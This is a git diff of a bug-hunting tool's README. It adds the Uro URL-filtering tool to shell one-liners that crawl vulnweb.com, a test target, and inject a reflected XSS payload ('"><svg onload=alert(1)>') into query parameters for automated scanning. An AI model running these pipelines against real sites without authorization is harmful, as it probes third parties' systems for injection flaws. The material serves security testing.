@@ -41,12 +41,14 @@ bau vulnweb.com -s
 
 > [HTTPx](https://github.com/projectdiscovery/httpx) - URL probbing 
 
+> [Uro](https://github.com/s0md3v/uro) - Removing unnecessary urls
+
 ```bash
 # Pratical use with XARGS
 echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -ns' | nilo
 
 # XSS Hunting w/ NILO (Faster)
-echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | nilo | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
+echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | nilo | uro | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
 
 # XSS Hunting w/ HTTPx (Probbing & slower)
 echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | httpx -silent -mc 200 | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
